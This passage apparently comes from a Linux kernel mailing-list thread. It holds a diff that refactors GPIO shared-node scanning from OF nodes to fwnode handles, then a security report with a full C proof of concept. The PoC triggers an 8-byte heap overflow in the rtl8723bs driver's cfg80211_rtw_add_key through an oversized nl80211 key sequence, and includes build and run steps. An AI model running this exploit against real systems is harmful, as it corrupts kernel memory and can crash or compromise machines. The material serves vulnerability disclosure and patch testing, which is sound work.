--			if (!suffix)
--				continue;
-+		if (strends(propname, "gpios"))
-+			suffix = "-gpios";
-+		else if (strends(propname, "gpio"))
-+			suffix = "-gpio";
-+		else
-+			suffix = NULL;
-+		if (!suffix)
-+			continue;
- 
--			/* We only set con_id if there's actually one. */
--			if (strcmp(prop->name, "gpios") && strcmp(prop->name, "gpio")) {
--				con_id = kstrdup(prop->name, GFP_KERNEL);
--				if (!con_id)
--					return -ENOMEM;
-+		/* We only set con_id if there's actually one. */
-+		if (strcmp(propname, "gpios") && strcmp(propname, "gpio")) {
-+			con_id = kstrdup(propname, GFP_KERNEL);
-+			if (!con_id)
-+				return -ENOMEM;
- 
--				con_id_len = strlen(con_id);
--				suffix_len = strlen(suffix);
-+			con_id_len = strlen(con_id);
-+			suffix_len = strlen(suffix);
- 
--				con_id[con_id_len - suffix_len] = '\0';
--			}
-+			con_id[con_id_len - suffix_len] = '\0';
-+		}
- 
--			struct fwnode_handle *curr_fwnode =
--				fwnode_handle_get(of_fwnode_handle(curr));
--			ref = gpio_shared_make_ref(curr_fwnode, con_id, args.args[1]);
--			if (!ref) {
--				fwnode_handle_put(curr_fwnode);
--				return -ENOMEM;
--			}
-+		ref = gpio_shared_make_ref(fwnode_handle_get(curr), con_id, args.args[1]);
-+		if (!ref) {
-+			fwnode_handle_put(curr);
-+			return -ENOMEM;
-+		}
- 
--			if (!list_empty(&entry->refs))
--				pr_debug("GPIO %u at %s is shared by multiple firmware nodes\n",
--					 entry->offset, fwnode_get_name(entry->fwnode));
-+		if (!list_empty(&entry->refs))
-+			pr_debug("GPIO %u at %s is shared by multiple firmware nodes\n",
-+				 entry->offset, fwnode_get_name(entry->fwnode));
- 
--			list_add_tail(&ref->list, &entry->refs);
-+		list_add_tail(&ref->list, &entry->refs);
- 
--			if (strcmp(prop->name, "reset-gpios") == 0) {
--				ret = gpio_shared_setup_reset_proxy(entry, args.args[1]);
--				if (ret)
--					return ret;
--			}
-+		if (strcmp(propname, "reset-gpios") == 0) {
-+			ret = gpio_shared_setup_reset_proxy(entry, args.args[1]);
-+			if (ret)
-+				return ret;
- 		}
- 	}
- 
--	for_each_child_of_node_scoped(curr, child) {
--		ret = gpio_shared_of_traverse(child);
-+	return 0;
-+}
-+
-+static int gpio_shared_fwnode_scan_properties(struct fwnode_handle *curr)
-+{
-+	char **props;
-+	int ret, i;
-+
-+	ret = fwnode_property_get_names(curr, &props);
-+	if (ret <= 0)
-+		return ret;
-+
-+	CLASS(strarray, names)(props, ret);
-+
-+	for (i = 0; i < names.size; i++) {
-+		ret = gpio_shared_fwnode_scan_property(curr, names.array[i]);
- 		if (ret)
- 			return ret;
- 	}
-@@ -292,19 +297,35 @@ static int gpio_shared_of_traverse(struct device_node *curr)
- 	return 0;
- }
- 
--static int gpio_shared_of_scan(void)
-+static int gpio_shared_fwnode_traverse(struct fwnode_handle *curr)
- {
--	if (of_root)
--		return gpio_shared_of_traverse(of_root);
-+	int ret;
-+
-+	if (gpio_shared_fwnode_ignore(curr))
-+		return 0;
-+
-+	ret = gpio_shared_fwnode_scan_properties(curr);
-+	if (ret)
-+		return ret;
-+
-+	fwnode_for_each_child_node_scoped(curr, child) {
-+		ret = gpio_shared_fwnode_traverse(child);
-+		if (ret)
-+			return ret;
-+	}
- 
- 	return 0;
- }
--#else
-+
- static int gpio_shared_of_scan(void)
- {
-+#if IS_ENABLED(CONFIG_OF)
-+	if (of_root)
-+		return gpio_shared_fwnode_traverse(of_fwnode_handle(of_root));
-+#endif
-+
- 	return 0;
- }
--#endif /* CONFIG_OF */
- 
- static void gpio_shared_adev_release(struct device *dev)
- {
+  BUG: KASAN: slab-out-of-bounds in cfg80211_rtw_add_key
+  Write of size 16 ...
 
--- 
-2.47.3
+On a kernel with the v7 patch applied, the same command should
+return NLMSG_ERROR with errno EINVAL and no splat.
+
+Build (needs libnl-3.0 / libnl-genl-3.0):
+
+  gcc -o poc poc_seq_overflow.c $(pkg-config --cflags --libs libnl-3.0 libn=
+l-genl-3.0)
+
+Run:
+
+  sudo ./poc wlan0
+
+Requires CAP_NET_ADMIN and an rtl8723bs interface present.
+
+--- poc_seq_overflow.c ---
+
+/*
+ * PoC: rtl8723bs cfg80211_rtw_add_key seq[] heap buffer overflow
+ *
+ * Bug:  drivers/staging/rtl8723bs/os_dep/ioctl_cfg80211.c ~line 887
+ *       memcpy(param->u.crypt.seq, params->seq, params->seq_len);
+ *
+ *       param->u.crypt.seq =3D u8 seq[8]  (fixed 8 bytes, ieee80211.h:190)
+ *       params->seq_len    =3D up to 16   (NL80211_KEY_SEQ .len=3D16, nl80=
+211.c:956)
+ *       Result: 8-byte heap overflow WRITE past seq[8]
+ *
+ * Overwritten fields (struct ieee_param.u.crypt):
+ *       offset 37: seq[8]    =E2=86=90 8 bytes written legitimately
+ *       offset 45: pad       =E2=86=90 1 byte overflow
+ *       offset 46: key_len   =E2=86=90 2 bytes overflow (u16, corrupted)
+ *       offset 48: key[]     =E2=86=90 5 bytes overflow
+ *
+ * Trigger: NL80211_CMD_NEW_KEY with 16-byte NL80211_ATTR_KEY_SEQ
+ * Requires: CAP_NET_ADMIN + rtl8723bs WiFi interface loaded
+ * Build:    gcc -o poc poc_seq_overflow.c $(pkg-config --cflags --libs lib=
+nl-3.0 libnl-genl-3.0)
+ * Run:      sudo ./poc wlan0
+ * Expect:   dmesg =E2=86=92 KASAN: slab-out-of-bounds WRITE in cfg80211_rt=
+w_add_key
+ *
+ * CWE-122 | CVSS 6.7 (AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
+ *
+ * Author: Feng Ning (feng@innora.ai) =E2=80=94 Innora Security Research
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <net/if.h>
+#include <netlink/genl/genl.h>
+#include <netlink/genl/ctrl.h>
+
+/* nl80211 command and attribute IDs */
+#define NL80211_CMD_NEW_KEY       13
+#define NL80211_ATTR_IFINDEX       3
+#define NL80211_ATTR_KEY_DATA     25
+#define NL80211_ATTR_KEY_IDX      26
+#define NL80211_ATTR_KEY_CIPHER   27
+#define NL80211_ATTR_KEY_SEQ      28
+#define WLAN_CIPHER_SUITE_TKIP    0x000FAC02
+
+int main(int argc, char **argv)
+{
+    struct nl_sock *sk;
+    struct nl_msg *msg;
+    int fam, ifidx, ret;
+
+    if (argc < 2) {
+        fprintf(stderr, "Usage: sudo %s <wlan_interface>\n", argv[0]);
+        fprintf(stderr, "  Requires rtl8723bs driver and CAP_NET_ADMIN\n");
+        return 1;
+    }
+
+    ifidx =3D if_nametoindex(argv[1]);
+    if (!ifidx) {
+        perror("if_nametoindex");
+        return 1;
+    }
+
+    sk =3D nl_socket_alloc();
+    if (!sk) { perror("nl_socket_alloc"); return 1; }
+
+    if (genl_connect(sk) < 0) {
+        fprintf(stderr, "genl_connect failed\n");
+        return 1;
+    }
+
+    fam =3D genl_ctrl_resolve(sk, "nl80211");
+    if (fam < 0) {
+        fprintf(stderr, "nl80211 family not found\n");
+        return 1;
+    }
+
+    msg =3D nlmsg_alloc();
+    genlmsg_put(msg, 0, 0, fam, 0, 0, NL80211_CMD_NEW_KEY, 0);
+
+    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifidx);
+    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, 0);
+    nla_put_u32(msg, NL80211_ATTR_KEY_CIPHER, WLAN_CIPHER_SUITE_TKIP);
+
+    /* TKIP requires 32-byte key */
+    uint8_t key[32];
+    memset(key, 0x41, sizeof(key));
+    nla_put(msg, NL80211_ATTR_KEY_DATA, sizeof(key), key);
+
+    /*
+     * OVERFLOW TRIGGER
+     *
+     * NL80211_ATTR_KEY_SEQ with 16 bytes.  nl80211.c allows up to 16.
+     * cfg80211 passes this to driver as params->seq / params->seq_len=3D16=
+.
+     * rtl8723bs copies all 16 bytes into seq[8] =E2=86=92 8 bytes past bou=
+ndary.
+     *
+     * The overflow pattern 0x42 ('B') will be visible in KASAN output
+     * and in the corrupted key_len / key[] fields.
+     */
+    uint8_t seq[16];
+    memset(seq, 0x42, sizeof(seq));
+    nla_put(msg, NL80211_ATTR_KEY_SEQ, sizeof(seq), seq);
+
+    printf("[*] rtl8723bs seq[] heap overflow PoC\n");
+    printf("[*] Interface: %s (ifindex %d)\n", argv[1], ifidx);
+    printf("[*] Sending NL80211_CMD_NEW_KEY with seq_len=3D16 (buffer=3D8)\=
+n");
+
+    ret =3D nl_send_auto(sk, msg);
+    if (ret < 0)
+        fprintf(stderr, "[-] send failed: %s\n", nl_geterror(ret));
+    else
+        printf("[+] Sent %d bytes\n", ret);
+
+    /* Receive response (will likely be -ENOLINK or similar, but overflow
+     * already happened in the driver before the error path) */
+    nl_recvmsgs_default(sk);
+
+    nlmsg_free(msg);
+    nl_socket_free(sk);
+
+    printf("[*] Done. Check 'dmesg | grep KASAN' for heap overflow report.\=
+n");
+    return 0;
+}
+
+--- end ---
+
+I have verified the trigger path by code review of the cfg80211 key
+installation path (nl80211 NL80211_KEY_SEQ policy allows .len =3D 16
+while the driver buffer is 8 bytes) but do not have the hardware to
+run it myself; that is exactly what a Tested-by from this list would
+add.
+
+Thanks,
+Feng Ning
 
